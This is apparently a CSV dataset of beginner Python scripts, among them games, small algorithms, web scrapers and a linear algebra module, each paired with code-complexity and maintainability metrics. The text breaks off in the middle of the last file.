filename,source,size_bytes,logical_lines,source_lines,blank_lines,comment_lines,single_comments,multiline_strings,number_functions,complexity,total_ops,unique_ops,total_operands,unique_operands,vocab,length,calc_length,volume,difficulty,maintainability,has_class,uses_input,uses_random,effort,id
Tic_Tac_Toe.py,"import random

# a python program for tic-tac-toe game
# module intro for introduction
# module show_board for values
# module playgame


def introduction():
    print(""Hello this a sample tic tac toe game"")
    print(""It will rotate turns between players one and two"")
    print(""While 3,3 would be the bottom right."")
    print(""Player 1 is X and Player 2 is O"")


def draw_board(board):
    print(""    |    |"")
    print(""  "" + board[7] + "" | "" + board[8] + ""  | "" + board[9])
    print(""    |    |"")
    print(""-------------"")
    print(""    |    |"")
    print(""  "" + board[4] + "" | "" + board[5] + ""  | "" + board[6])
    print(""    |    |"")
    print(""-------------"")
    print(""    |    |"")
    print(""  "" + board[1] + "" | "" + board[2] + ""  | "" + board[3])
    print(""    |    |"")


def input_player_letter():
    # Lets the player type witch letter they want to be.
    # Returns a list with the player's letter as the first item, and the computer's letter as the second.
    letter = """"
    while not (letter == ""X"" or letter == ""O""):
        print(""Do you want to be X or O? "")
        letter = input(""> "").upper()

    # the first element in the list is the playerâs letter, the second is the computer's letter.
    if letter == ""X"":
        return [""X"", ""O""]
    else:
        return [""O"", ""X""]


def frist_player():
    guess = random.randint(0, 1)
    if guess == 0:
        return ""Computer""
    else:
        return ""Player""


def play_again():
    print(""Do you want to play again? (y/n)"")
    return input().lower().startswith(""y"")


def make_move(board, letter, move):
    board[move] = letter


def is_winner(bo, le):
    # Given a board and a playerâs letter, this function returns True if that player has won.
    # We use bo instead of board and le instead of letter so we donât have to type as much.
    return (
        (bo[7] == le and bo[8] == le and bo[9] == le)
        or (bo[4] == le and bo[5] == le and bo[6] == le)
        or (bo[1] == le and bo[2] == le and bo[3] == le)
        or (bo[7] == le and bo[4] == le and bo[1] == le)
        or (bo[8] == le and bo[5] == le and bo[2] == le)
        or (bo[9] == le and bo[6] == le and bo[3] == le)
        or (bo[7] == le and bo[5] == le and bo[3] == le)
        or (bo[9] == le and bo[5] == le and bo[1] == le)
    )


def get_board_copy(board):
    dupe_board = []
    for i in board:
        dupe_board.append(i)
    return dupe_board


def is_space_free(board, move):
    return board[move] == "" ""


def get_player_move(board):
    # Let the player type in their move
    move = "" ""
    while move not in ""1 2 3 4 5 6 7 8 9"".split() or not is_space_free(
        board, int(move)
    ):
        print(""What is your next move? (1-9)"")
        move = input()
    return int(move)


def choose_random_move_from_list(board, moveslist):
    possible_moves = []
    for i in moveslist:
        if is_space_free(board, i):
            possible_moves.append(i)

    if len(possible_moves) != 0:
        return random.choice(possible_moves)
    else:
        return None


def get_computer_move(board, computer_letter):
    if computer_letter == ""X"":
        player_letter = ""O""
    else:
        player_letter = ""X""

    for i in range(1, 10):
        copy = get_board_copy(board)
        if is_space_free(copy, i):
            make_move(copy, computer_letter, i)
            if is_winner(copy, computer_letter):
                return i

    for i in range(1, 10):
        copy = get_board_copy(board)
        if is_space_free(copy, i):
            make_move(copy, player_letter, i)
            if is_winner(copy, player_letter):
                return i

    move = choose_random_move_from_list(board, [1, 3, 7, 9])
    if move != None:
        return move

    if is_space_free(board, 5):
        return 5

    return choose_random_move_from_list(board, [2, 4, 6, 8])


def is_board_full(board):
    for i in range(1, 10):
        if is_space_free(board, i):
            return False
    return True


print(""Welcome To Tic Tac Toe!"")

while True:
    the_board = ["" ""] * 10
    player_letter, computer_letter = input_player_letter()
    turn = frist_player()
    print(""The "" + turn + "" go frist."")
    game_is_playing = True

    while game_is_playing:
        if turn == ""player"":
            # players turn
            draw_board(the_board)
            move = get_player_move(the_board)
            make_move(the_board, player_letter, move)

            if is_winner(the_board, player_letter):
                draw_board(the_board)
                print(""Hoory! You have won the game!"")
                game_is_playing = False
            else:
                if is_board_full(the_board):
                    draw_board(the_board)
                    print(""The game is tie!"")
                    break
                else:
                    turn = ""computer""
        else:
            # Computer's turn
            move = get_computer_move(the_board, computer_letter)
            make_move(the_board, computer_letter, move)

            if is_winner(the_board, computer_letter):
                draw_board(the_board)
                print(""The computer has beaten you! You Lose."")
                game_is_playing = False
            else:
                if is_board_full(the_board):
                    draw_board(the_board)
                    print(""The game is a tie!"")
                    break
                else:
                    turn = ""player""
    if not play_again():
        break
",5487,129,140,40,12,12,0,13.0,57,66,8,143.0,110,,209,769.9495684877126,1438.472397316625,5.2,bajo,No,True,True,High,id0
AREA OF TRIANGLE.py,"# Python Program to find the area of triangle
# calculates area of traingle in efficient way!!
a = 5
b = 6
c = 7

# Uncomment below to take inputs from the user
# a = float(input('Enter first side: '))
# b = float(input('Enter second side: '))
# c = float(input('Enter third side: '))

# calculate the semi-perimeter
s = (a + b + c) / 2

# calculate the area
area = (s * (s - a) * (s - b) * (s - c)) ** 0.5
print(""The area of the triangle is %0.2f"" % area)
",457,6,6,3,8,8,0,0.0,0,11,6,22.0,16,,33,79.50977500432694,147.1612434150308,4.125,alto,No,True,False,Low-Medium,id1
Bird.py,"from threading import Thread

from Background import Background
from PIL.Image import open as openImage
from PIL.ImageTk import PhotoImage


class Bird(Thread):
    """"""
    Classe para criar um pÃ¡ssaro
    """"""

    __tag = ""Bird""
    __isAlive = None
    __going_up = False
    __going_down = 0
    __times_skipped = 0
    __running = False

    decends = 0.00390625
    climbsUp = 0.0911458333

    def __init__(
        self,
        background,
        gameover_function,
        *screen_geometry,
        fp=""bird.png"",
        event=""<Up>"",
        descend_speed=5
    ):

        # Verifica se ""background"" Ã© uma instÃ¢ncia de Background e se o ""gamerover_method"" Ã© chamÃ¡vel

        if not isinstance(background, Background):
            raise TypeError(
                ""The background argument must be an instance of Background.""
            )
        if not callable(gameover_function):
            raise TypeError(""The gameover_method argument must be a callable object."")

        # InstÃ¢ncia os parÃ¢metros
        self.__canvas = background
        self.image_path = fp
        self.__descend_speed = descend_speed
        self.gameover_method = gameover_function

        # Recebe a largura e altura do background
        self.__width = screen_geometry[0]
        self.__height = screen_geometry[1]

        # Define a decida e subida do pÃ¡ssaro com base na altura do background
        self.decends *= self.__height
        self.decends = int(self.decends + 0.5)
        self.climbsUp *= self.__height
        self.climbsUp = int(self.climbsUp + 0.5)

        # Invoca o mÃ©todo construtor de Thread
        Thread.__init__(self)

        # Calcula o tamanho do pÃ¡ssaro com base na largura e altura da janela
        self.width = (self.__width // 100) * 6
        self.height = (self.__height // 100) * 11

        # Carrega e cria a imagem do pÃ¡ssaro no background
        self.__canvas.bird_image = self.getPhotoImage(
            image_path=self.image_path,
            width=self.width,
            height=self.height,
            closeAfter=True,
        )[0]
        self.__birdID = self.__canvas.create_image(
            self.__width // 2,
            self.__height // 2,
            image=self.__canvas.bird_image,
            tag=self.__tag,
        )

        # Define evento para fazer o pÃ¡ssaro subir
        self.__canvas.focus_force()
        self.__canvas.bind(event, self.jumps)
        self.__isAlive = True

    def birdIsAlive(self):
        """"""
        MÃ©todo para verificar se o pÃ¡ssaro estÃ¡ vivo
        """"""

        return self.__isAlive

    def checkCollision(self):
        """"""
        MÃ©todo para verificar se o pÃ¡ssaro ultrapassou a borda da janela ou colidiu com algo
        """"""

        # Recebe a posiÃ§Ã£o do pÃ¡ssaro no background
        position = list(self.__canvas.bbox(self.__tag))

        # Se o pÃ¡ssaro tiver ultrapassado a borda de baixo do background, ele serÃ¡ declarado morto
        if position[3] >= self.__height + 20:
            self.__isAlive = False

        # Se o pÃ¡ssaro tiver ultrapassado a borda de cima do background, ele serÃ¡ declarado morto
        if position[1] <= -20:
            self.__isAlive = False

        # DÃ¡ uma margem de erro ao pÃ¡ssaro de X pixels
        position[0] += int(25 / 78 * self.width)
        position[1] += int(25 / 77 * self.height)
        position[2] -= int(20 / 78 * self.width)
        position[3] -= int(10 / 77 * self.width)

        # Define os objetos a serem ignorados em colisÃµes
        ignored_collisions = self.__canvas.getBackgroundID()
        ignored_collisions.append(self.__birdID)

        # Verifica possÃ­veis colisÃµes com o pÃ¡ssaro
        possible_collisions = list(self.__canvas.find_overlapping(*position))

        # Remove das possÃ­veis colisÃµes os objetos ignorados
        for _id in ignored_collisions:
            try:
                possible_collisions.remove(_id)
            except BaseException:
                continue

        # Se houver alguma colisÃ£o o pÃ¡ssaro morre
        if len(possible_collisions) >= 1:
            self.__isAlive = False

        return not self.__isAlive

    def getTag(self):
        """"""
        MÃ©todo para retornar a tag do pÃ¡ssaro
        """"""

        return self.__tag

    @staticmethod
    def getPhotoImage(
        image=None, image_path=None, width=None, height=None, closeAfter=False
    ):
        """"""
        Retorna um objeto da classe PIL.ImageTk.PhotoImage de uma imagem e as imagens criadas de PIL.Image
        (photoImage, new, original)

        @param image: InstÃ¢ncia de PIL.Image.open
        @param image_path: DiretÃ³rio da imagem
        @param width: Largura da imagem
        @param height: Altura da imagem
        @param closeAfter: Se True, a imagem serÃ¡ fechada apÃ³s ser criado um PhotoImage da mesma
        """"""

        if not image:
            if not image_path:
                return

            # Abre a imagem utilizando o caminho dela
            image = openImage(image_path)

        # SerÃ¡ redimesionada a imagem somente se existir um width ou height
        if not width:
            width = image.width
        if not height:
            height = image.height

        # Cria uma nova imagem jÃ¡ redimensionada
        newImage = image.resize([width, height])

        # Cria um photoImage
        photoImage = PhotoImage(newImage)

        # Se closeAfter for True, ele fecha as imagens
        if closeAfter:
            # Fecha a imagem nova
            newImage.close()
            newImage = None

            # Fecha a imagem original
            image.close()
            image = None

        # Retorna o PhotoImage da imagem,a nova imagem que foi utilizada e a imagem original
        return photoImage, newImage, image

    def jumps(self, event=None):
        """"""
        MÃ©todo para fazer o pÃ¡ssaro pular
        """"""

        # Verifica se o pÃ¡ssaro saiu da Ã¡rea do background
        self.checkCollision()

        # Se o pÃ¡ssaro estiver morto, esse mÃ©todo nÃ£o pode ser executado
        if not self.__isAlive or not self.__running:
            self.__going_up = False
            return

        # Declara que o pÃ¡ssaro estÃ¡ subindo
        self.__going_up = True
        self.__going_down = 0

        # Move o pÃ¡ssaro enquanto o limite de subida por animaÃ§Ã£o nÃ£o tiver excedido
        if self.__times_skipped < self.climbsUp:

            # Move o pÃ¡ssaro para cima
            self.__canvas.move(self.__tag, 0, -1)
            self.__times_skipped += 1

            # Executa o mÃ©todo novamente
            self.__canvas.after(3, self.jumps)

        else:

            # Declara que o pÃ¡ssaro nÃ£o estÃ¡ mais subindo
            self.__going_up = False
            self.__times_skipped = 0

    def kill(self):
        """"""
        MÃ©todo para matar o pÃ¡ssaro
        """"""

        self.__isAlive = False

    def run(self):
        """"""
        #MÃ©todo para iniciar a animaÃ§Ã£o do passÃ¡ro caindo
        """"""

        self.__running = True

        # Verifica se o pÃ¡ssaro saiu da Ã¡rea do background
        self.checkCollision()

        # Enquanto o pÃ¡ssaro nÃ£o tiver chegado em sua velocidade mÃ¡xima, a velocidade aumentarÃ¡ em 0.05
        if self.__going_down < self.decends:
            self.__going_down += 0.05

        # Executa a animaÃ§Ã£o de descida somente se o pÃ¡ssaro estiver vivo
        if self.__isAlive:

            # Executa a animaÃ§Ã£o de descida somente se o pÃ¡ssaro nÃ£o estiver subindo
            if not self.__going_up:
                # Move o pÃ¡ssaro para baixo
                self.__canvas.move(self.__tag, 0, self.__going_down)

            # Executa novamente o mÃ©todo
            self.__canvas.after(self.__descend_speed, self.run)

        # Se o pÃ¡ssaro estiver morto, serÃ¡ executado um mÃ©todo de fim de jogo
        else:
            self.__running = False
            self.gameover_method()
",7932,115,129,58,38,38,30,8.0,30,43,11,74.0,55,,117,356.02853204886657,707.194111964939,7.4,medio,Yes,False,False,,id2
balance_parenthesis.py,"class Stack:
    def __init__(self):
        self.items = []

    def push(self, item):
        self.items.append(item)

    def pop(self):
        return self.items.pop()

    def is_empty(self):
        return self.items == []

    def peek(self):
        return self.items[-1]

    def display(self):
        return self.items


def is_same(p1, p2):
    if p1 == ""("" and p2 == "")"":
        return True
    elif p1 == ""["" and p2 == ""]"":
        return True
    elif p1 == ""{"" and p2 == ""}"":
        return True
    else:
        return False


def is_balanced(check_string):
    s = Stack()
    index = 0
    is_bal = True
    while index < len(check_string) and is_bal:
        paren = check_string[index]
        if paren in ""{[("":
            s.push(paren)
        else:
            if s.is_empty():
                is_bal = False
            else:
                top = s.pop()
                if not is_same(top, paren):
                    is_bal = False
        index += 1

    if s.is_empty() and is_bal:
        return True
    else:
        return False


print(is_balanced(""[((())})]""))
",1100,43,43,12,0,0,0,8.0,23,17,7,32.0,26,,49,141.86291712607164,247.1753118485642,4.307692307692308,bajo,Yes,False,False,Medium,id3
binary search.py,"def binarySearchAppr (arr, start, end, x):
# check condition
   if end >= start:
      mid = start + (end- start)//2
      # If element is present at the middle
      if arr[mid] == x:
         return mid
      # If element is smaller than mid
      elif arr[mid] > x:
         return binarySearchAppr(arr, start, mid-1, x)
      # Else the element greator than mid
      else:
         return binarySearchAppr(arr, mid+1, end, x)
   else:
      # Element is not found in the array
      return -1
arr = sorted(['t','u','t','o','r','i','a','l'])
x ='r'
result = binarySearchAppr(arr, 0, len(arr)-1, x)
if result != -1:
   print (""Element is present at index ""+str(result))
else:
   print (""Element is not present in array"")
",724,18,18,0,5,5,0,1.0,4,13,8,24.0,16,24.0,37,88.0,169.6436125266828,6.0,alto,No,False,False,Medium,id4
Web_Scraper.py,"""""""
Author: Chayan Chawra
git: github.com/Chayan-19
Requirements: selenium, BeautifulSoup
""""""

import requests
from bs4 import BeautifulSoup
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import time

# url of the page we want to scrape
url = ""https://www.naukri.com/top-jobs-by-designations# desigtop600""

# initiating the webdriver. Parameter includes the path of the webdriver.
driver = webdriver.Chrome(""./chromedriver"")
driver.get(url)

# this is just to ensure that the page is loaded
time.sleep(5)

html = driver.page_source

# this renders the JS code and stores all
# of the information in static HTML code.

# Now, we could simply apply bs4 to html variable
soup = BeautifulSoup(html, ""html.parser"")
all_divs = soup.find(""div"", {""id"": ""nameSearch""})
job_profiles = all_divs.find_all(""a"")

# printing top ten job profiles
count = 0
for job_profile in job_profiles:
    print(job_profile.text)
    count = count + 1
    if count == 10:
        break

driver.close()  # closing the webdriver
",1031,22,20,9,8,7,5,0.0,0,2,2,4.0,3,,6,6.754887502163469,13.931568569324174,1.3333333333333333,alto,No,False,False,Low,id5
sWAP_cASE.py,"# You are given a string and your task is to swap cases. In other words, convert all lowercase letters to uppercase letters and vice versa.


def swap_case(s):
    return s.swapcase()


if __name__ == ""__main__"":
    s = input()
    result = swap_case(s)
    print(result)
",273,6,6,4,1,1,0,1.0,1,1,1,2.0,2,,3,2.0,4.754887502163469,0.5,alto,No,True,False,Low,id6
Justdial Scrapper GUI.py,"import csv
import threading
import urllib.request
from tkinter import HORIZONTAL, Button, Entry, Label, Tk
from tkinter.ttk import Progressbar

from bs4 import BeautifulSoup


class ScrapperLogic:
    def __init__(self, query, location, file_name, progressbar, label_progress):
        self.query = query
        self.location = location
        self.file_name = file_name
        self.progressbar = progressbar
        self.label_progress = label_progress

    @staticmethod
    def inner_html(element):
        return element.decode_contents(formatter=""html"")

    @staticmethod
    def get_name(body):
        return body.find(""span"", {""class"": ""jcn""}).a.string

    @staticmethod
    def which_digit(html):
        mapping_dict = {
            ""icon-ji"": 9,
            ""icon-dc"": ""+"",
            ""icon-fe"": ""("",
            ""icon-hg"": "")"",
            ""icon-ba"": ""-"",
            ""icon-lk"": 8,
            ""icon-nm"": 7,
            ""icon-po"": 6,
            ""icon-rq"": 5,
            ""icon-ts"": 4,
            ""icon-vu"": 3,
            ""icon-wx"": 2,
            ""icon-yz"": 1,
            ""icon-acb"": 0,
        }
        return mapping_dict.get(html, """")

    def get_phone_number(self, body):
        i = 0
        phone_no = ""No Number!""
        try:
            for item in body.find(""p"", {""class"": ""contact-info""}):
                i += 1
                if i == 2:
                    phone_no = """"
                    try:
                        for element in item.find_all(class_=True):
                            classes = []
                            classes.extend(element[""class""])
                            phone_no += str((self.which_digit(classes[1])))
                    except Exception:
                        pass
        except Exception:
            pass
        body = body[""data-href""]
        soup = BeautifulSoup(body, ""html.parser"")
        for a in soup.find_all(""a"", {""id"": ""whatsapptriggeer""}):
            # print (a)
            phone_no = str(a[""href""][-10:])

        return phone_no

    @staticmethod
    def get_rating(body):
        rating = 0.0
        text = body.find(""span"", {""class"": ""star_m""})
        if text is not None:
            for item in text:
                rating += float(item[""class""][0][1:]) / 10

        return rating

    @staticmethod
    def get_rating_count(body):
        text = body.find(""span"", {""class"": ""rt_count""}).string

        # Get only digits
        rating_count = """".join(i for i in text if i.isdigit())
        return rating_count

    @staticmethod
    def get_address(body):
        return body.find(""span"", {""class"": ""mrehover""}).text.strip()

    @staticmethod
    def get_location(body):
        text = body.find(""a"", {""class"": ""rsmap""})
        if not text:
            return
        text_list = text[""onclick""].split("","")

        latitude = text_list[3].strip().replace(""'"", """")
        longitude = text_list[4].strip().replace(""'"", """")

        return latitude + "", "" + longitude

    def start_scrapping_logic(self):
        page_number = 1
        service_count = 1

        total_url = ""https://www.justdial.com/{0}/{1}"".format(self.location, self.query)

        fields = [""Name"", ""Phone"", ""Rating"", ""Rating Count"", ""Address"", ""Location""]
        out_file = open(""{0}.csv"".format(self.file_name), ""w"")
        csvwriter = csv.DictWriter(out_file, delimiter="","", fieldnames=fields)
        csvwriter.writerow(
            {
                ""Name"": ""Name"",  # Shows the name
                ""Phone"": ""Phone"",  # shows the phone
                ""Rating"": ""Rating"",  # shows the ratings
                ""Rating Count"": ""Rating Count"",  # Shows the stars for ex: 4 stars
                ""Address"": ""Address"",  # Shows the address of the place
                ""Location"": ""Location"",  # shows the location
            }
        )

        progress_value = 0
        while True:
            # Check if reached end of result
            if page_number > 50:
                progress_value = 100
                self.progressbar[""value""] = progress_value
                break

            if progress_value != 0:
                progress_value += 1
                self.label_progress[""text""] = ""{0}{1}"".format(progress_value, ""%"")
                self.progressbar[""value""] = progress_value

            url = total_url + ""/page-%s"" % page_number
            print(""{0} {1}, {2}"".format(""Scrapping page number: "", page_number, url))
            req = urllib.request.Request(
                url, headers={""User-Agent"": ""Mozilla/5.0 (Windows NT 6.1; Win64; x64)""}
            )
            page = urllib.request.urlopen(req)

            soup = BeautifulSoup(page.read(), ""html.parser"")
            services = soup.find_all(""li"", {""class"": ""cntanr""})

            # Iterate through the 10 results in the page

            progress_value += 1
            self.label_progress[""text""] = ""{0}{1}"".format(progress_value, ""%"")
            self.progressbar[""value""] = progress_value

            for service_html in services:
                try:
                    # Parse HTML to fetch data
                    dict_service = {}
                    name = self.get_name(service_html)
                    print(name)
                    phone = self.get_phone_number(service_html)
                    rating = self.get_rating(service_html)
                    count = self.get_rating_count(service_html)
                    address = self.get_address(service_html)
                    location = self.get_location(service_html)
                    if name is not None:
                        dict_service[""Name""] = name
                    if phone is not None:
                        print(""getting phone number"")
                        dict_service[""Phone""] = phone
                    if rating is not None:
                        dict_service[""Rating""] = rating
                    if count is not None:
                        dict_service[""Rating Count""] = count
                    if address is not None:
                        dict_service[""Address""] = address
                    if location is not None:
                        dict_service[""Address""] = location

                    # Write row to CSV
                    csvwriter.writerow(dict_service)

                    print(""#"" + str(service_count) + "" "", dict_service)
                    service_count += 1
                except AttributeError:
                    print(""AttributeError Occurred 101"")

            page_number += 1

        out_file.close()


class JDScrapperGUI:
    def __init__(self, master):
        self.master = master

        self.label_query = Label
        self.entry_query = Entry

        self.label_location = Label
        self.entry_location = Entry

        self.label_file_name = Label
        self.entry_file_name = Entry

        self.label_progress = Label
        self.button_start = Button

        # Progress bar widget
        self.progress = Progressbar

    def start_scrapping(self):
        query = self.entry_query.get()
        location = self.entry_location.get()
        file_name = self.entry_file_name.get()
        scrapper = ScrapperLogic(
            query, location, file_name, self.progress, self.label_progress
        )
        t1 = threading.Thread(target=scrapper.start_scrapping_logic, args=[])
        t1.start()

    def start(self):
        self.label_query = Label(self.master, text=""Query"")
        self.label_query.grid(row=0, column=0)

        self.entry_query = Entry(self.master, width=23)
        self.entry_query.grid(row=0, column=1)

        self.label_location = Label(self.master, text=""Location"")
        self.label_location.grid(row=1, column=0)

        self.entry_location = Entry(self.master, width=23)
        self.entry_location.grid(row=1, column=1)

        self.label_file_name = Label(self.master, text=""File Name"")
        self.label_file_name.grid(row=2, column=0)

        self.entry_file_name = Entry(self.master, width=23)
        self.entry_file_name.grid(row=2, column=1)

        self.label_progress = Label(self.master, text=""0%"")
        self.label_progress.grid(row=3, column=0)

        self.button_start = Button(
            self.master, text=""Start"", command=self.start_scrapping
        )
        self.button_start.grid(row=3, column=1)

        self.progress = Progressbar(
            self.master, orient=HORIZONTAL, length=350, mode=""determinate""
        )
        self.progress.grid(row=4, columnspan=2)

    # Above is the progress bar


if __name__ == ""__main__"":
    root = Tk()
    root.geometry(""350x130+600+100"")
    root.title(""Just Dial Scrapper - Cool"")
    JDScrapperGUI(root).start()
    root.mainloop()
",8694,182,203,50,14,8,0,13.0,41,27,9,52.0,39,,79,234.6600115486085,441.2120375569714,6.0,bajo,Yes,False,False,Medium-High,id7
Ohms_law.py,"def ohms_law(v=0, i=0, r=0):
    if v == 0:
        result = i * r
        return result
    elif i == 0:
        result = v / r
        return result
    elif r == 0:
        result = v / i
        return result
    else:
        return 0
",240,12,12,0,0,0,0,1.0,4,6,3,12.0,4,,18,12.75488750216347,50.53238859703688,4.5,medio,No,False,False,Low,id8
Day_of_week.py,"# Python program to Find day of
# the week for a given date
import re  # regular expressions
import calendar  # module of python to provide useful fucntions related to calendar
import datetime  # module of python to get the date and time


def process_date(user_input):
    user_input = re.sub(r""/"", "" "", user_input)  # substitute / with space
    user_input = re.sub(r""-"", "" "", user_input)  # substitute - with space
    return user_input


def find_day(date):
    born = datetime.datetime.strptime(
        date, ""%d %m %Y""
    ).weekday()  # this statement returns an integer corresponding to the day of the week
    return calendar.day_name[
        born
    ]  # this statement returns the corresponding day name to the integer generated in the previous statement


# To get the input from the user
# User may type 1/2/1999 or 1-2-1999
# To overcome those we have to process user input and make it standard to accept as defined by  calender and time module
user_input = str(input(""Enter date     ""))
date = process_date(user_input)
print(""Day on "" + user_input + ""  is "" + find_day(date))
",1094,13,17,6,12,5,0,2.0,2,3,1,6.0,6,,9,15.509775004326936,25.26619429851844,0.5,alto,No,True,False,Low,id9
consonant.py,"my_string = input(""Enter a string to count number of consonants: "")
string_check = [
    ""a"",
    ""e"",
    ""i"",
    ""o"",
    ""u"",
    ""A"",
    ""E"",
    ""I"",
    ""O"",
    ""U"",
]  # list for checking vowels


def count_con(string):
    c = 0
    for i in range(len(string)):
        if (
            string[i] not in string_check
        ):  # counter increases if the character is not vowel
            c += 1
    return c


counter = count_con(my_string)
print(f""Number of consonants in {my_string} is {counter}."")
",515,10,23,4,2,0,0,1.0,3,2,2,4.0,4,6.0,6,10.0,15.509775004326936,1.0,alto,No,True,False,,id10
lib.py,"# -*- coding: utf-8 -*-
""""""
Created on Mon Feb 26 14:29:11 2018

@author: Christian Bender
@license: MIT-license

This module contains some useful classes and functions for dealing
with linear algebra in python.

Overview:

- class Vector
- function zeroVector(dimension)
- function unitBasisVector(dimension,pos)
- function axpy(scalar,vector1,vector2)
- function randomVector(N,a,b)
- class Matrix
- function squareZeroMatrix(N)
- function randomMatrix(W,H,a,b)
""""""

import math
import random


class Vector(object):
    """"""
    This class represents a vector of arbitray size.
    You need to give the vector components.

    Overview about the methods:

    constructor(components : list) : init the vector
    set(components : list) : changes the vector components.
    __str__() : toString method
    component(i : int): gets the i-th component (start by 0)
    size() : gets the size of the vector (number of components)
    euclidLength() : returns the eulidean length of the vector.
    operator + : vector addition
    operator - : vector subtraction
    operator * : scalar multiplication and dot product
    copy() : copies this vector and returns it.
    changeComponent(pos,value) : changes the specified component.
    TODO: compare-operator
    """"""

    def __init__(self, components):
        """"""
        input: components or nothing
        simple constructor for init the vector
        """"""
        self.__components = components

    def set(self, components):
        """"""
        input: new components
        changes the components of the vector.
        replace the components with newer one.
        """"""
        if len(components) > 0:
            self.__components = components
        else:
            raise Exception(""please give any vector"")

    def __str__(self):
        """"""
        returns a string representation of the vector
        """"""
        ans = ""(""
        length = len(self.__components)
        for i in range(length):
            if i != length - 1:
                ans += str(self.__components[i]) + "",""
            else:
                ans += str(self.__components[i]) + "")""
        if len(ans) == 1:
            ans += "")""
        return ans

    def component(self, i):
        """"""
        input: index (start at 0)
        output: the i-th component of the vector.
        """"""
        if i < len(self.__components) and i >= 0:
            return self.__components[i]
        else:
            raise Exception(""index out of range"")

    def size(self):
        """"""
        returns the size of the vector
        """"""
        return len(self.__components)

    def eulidLength(self):
        """"""
        returns the eulidean length of the vector
        """"""
        summe = 0
        for c in self.__components:
            summe += c ** 2
        return math.sqrt(summe)

    def __add__(self, other):
        """"""
        input: other vector
        assumes: other vector has the same size
        returns a new vector that represents the sum.
        """"""
        size = self.size()
        result = []
        if size == other.size():
            for i in range(size):
                result.append(self.__components[i] + other.component(i))
        else:
            raise Exception(""must have the same size"")
        return Vector(result)

    def __sub__(self, other):
        """"""
        input: other vector
        assumes: other vector has the same size
        returns a new vector that represents the differenz.
        """"""
        size = self.size()
        result = []
        if size == other.size():
            for i in range(size):
                result.append(self.__components[i] - other.component(i))
        else:  # error case
            raise Exception(""must have the same size"")
        return Vector(result)

    def __mul__(self, other):
        """"""
        mul implements the scalar multiplication
        and the dot-product
        """"""
        ans = []
        if isinstance(other, float) or isinstance(other, int):
            for c in self.__components:
                ans.append(c * other)
        elif isinstance(other, Vector) and (self.size() == other.size()):
            size = self.size()
            summe = 0
            for i in range(size):
                summe += self.__components[i] * other.component(i)
            return summe
        else:  # error case
            raise Exception(""invalide operand!"")
        return Vector(ans)

    def copy(self):
        """"""
        copies this vector and returns it.
        """"""
        components = [x for x in self.__components]
        return Vector(components)

    def changeComponent(self, pos, value):
        """"""
        input: an index (pos) and a value
        changes the specified component (pos) with the
        'value'
        """"""
        # precondition
        assert pos >= 0 and pos < len(self.__components)
        self.__components[pos] = value

    def norm(self):
        """"""
        normalizes this vector and returns it.
        """"""
        eLength = self.eulidLength()
        quotient = 1.0 / eLength
        for i in range(len(self.__components)):
            self.__components[i] = self.__components[i] * quotient
        return self

    def __eq__(self, other):
        """"""
        returns true if the vectors are equal otherwise false.
        """"""
        ans = True
        SIZE = self.size()
        if SIZE == other.size():
            for i in range(SIZE):
                if self.__components[i] != other.component(i):
                    ans = False
                    break
        else:
            ans = False
        return ans


def zeroVector(dimension):
    """"""
    returns a zero-vector of size 'dimension'
    """"""
    # precondition
    assert isinstance(dimension, int)
    ans = []
    for i in range(dimension):
        ans.append(0)
    return Vector(ans)


def unitBasisVector(dimension, pos):
    """"""
    returns a unit basis vector with a One
    at index 'pos' (indexing at 0)
    """"""
    # precondition
    assert isinstance(dimension, int) and (isinstance(pos, int))
    ans = []
    for i in range(dimension):
        if i != pos:
            ans.append(0)
        else:
            ans.append(1)
    return Vector(ans)


def axpy(scalar, x, y):
    """"""
    input: a 'scalar' and two vectors 'x' and 'y'
    output: a vector
    computes the axpy operation
    """"""
    # precondition
    assert (
        isinstance(x, Vector)
        and (isinstance(y, Vector))
        and (isinstance(scalar, int) or isinstance(scalar, float))
    )
    return x * scalar + y


def randomVector(N, a, b):
    """"""
    input: size (N) of the vector.
           random range (a,b)
    output: returns a random vector of size N, with
            random integer components between 'a' and 'b'.
    """"""
    ans = zeroVector(N)
    random.seed(None)
    for i in range(N):
        ans.changeComponent(i, random.randint(a, b))
    return ans


class Matrix(object):
    """"""
    class: Matrix
    This class represents a arbitrary matrix.

    Overview about the methods:

         __str__() : returns a string representation
           operator * : implements the matrix vector multiplication
                        implements the matrix-scalar multiplication.
           changeComponent(x,y,value) : changes the specified component.
           component(x,y) : returns the specified component.
           width() : returns the width of the matrix
           height() : returns the height of the matrix
           operator + : implements the matrix-addition.
           operator - _ implements the matrix-subtraction
    """"""

    def __init__(self, matrix, w, h):
        """"""
        simple constructor for initialzes
        the matrix with components.
        """"""
        self.__matrix = matrix
        self.__width = w
        self.__height = h

    def __str__(self):
        """"""
        returns a string representation of this
        matrix.
        """"""
        ans = """"
        for i in range(self.__height):
            ans += ""|""
            for j in range(self.__width):
                if j < self.__width - 1:
                    ans += str(self.__matrix[i][j]) + "",""
                else:
                    ans += str(self.__matrix[i][j]) + ""|\n""
        return ans

    def changeComponent(self, x, y, value):
        """"""
        changes the x-y component of this matrix
        """"""
        if x >= 0 and x < self.__height and y >= 0 and y < self.__width:
            self.__matrix[x][y] = value
        else:
            raise Exception(""changeComponent: indices out of bounds"")

    def component(self, x, y):
        """"""
        returns the specified (x,y) component
        """"""
        if x >= 0 and x < self.__height and y >= 0 and y < self.__width:
            return self.__matrix[x][y]
        else:
            raise Exception(""changeComponent: indices out of bounds"")

    def width(self):
        """"""
        getter for the width
        """"""
        return self.__width

    def height(self):
        """"""
        getter for the height
        """"""
        return self.__height

    def __mul__(self, other):
        """"""
        implements the matrix-vector multiplication.
        implements the matrix-scalar multiplication
        """"""
        if isinstance(other, Vector):  # vector-matrix
            if other.size() == self.__width:
                ans = zeroVector(self.__height)
                for i in range(self.__height):
                    summe = 0
                    for j in range(self.__width):
                        summe += other.component(j) * self.__matrix[i][j]
                    ans.changeComponent(i, summe)
                    summe = 0
                return ans
            else:
                raise Exception(
                    ""vector must have the same size as the ""
                    + ""number of columns of the matrix!""
                )
        elif isinstance(other, int) or isinstance(other, float):  # matrix-scalar
            matrix = []
            for i in range(self.__height):
                row = []
                for j in range(self.__width):
                    row.append(self.__matrix[i][j] * other)
                matrix.append(row)
            return Matrix(matrix, self.__width, self.__height)

    def __add__(self, other):
        """"""
        implements the matrix-addition.
        """"""
        if self.__width == other.width() and self.__height == other.height():
            matrix = []
            for i in range(self.__height):
                row = []
                for j in range(self.__width):
                    row.append(self.__matrix[i][j] + other.component(i, j))
                matrix.append(row)
